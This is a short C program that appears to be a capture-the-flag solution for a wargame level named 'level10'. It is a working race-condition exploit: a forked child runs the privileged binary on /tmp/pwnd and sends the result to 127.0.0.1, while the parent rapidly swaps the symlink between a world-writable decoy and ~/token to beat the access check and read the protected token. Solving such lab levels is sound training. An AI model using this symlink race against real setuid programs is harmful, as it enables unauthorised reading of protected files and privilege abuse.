#include <unistd.h>


int main(int ac, char **av)
{
        pid_t pid;
        int i = 0;

        system("touch /tmp/owo ; chmod 777 /tmp/owo");
        pid = fork();
        if (pid == 0){
                while(i++ < 1000 ){
                system("~/level10 /tmp/pwnd 127.0.0.1");
                }
        }
        else{
                i = 0;
                while (i++ < 1000) {
                system("ln -fs /tmp/owo /tmp/pwnd");
                system("ln -fs ~/token /tmp/pwnd");
                }
        }
        return (0);
}
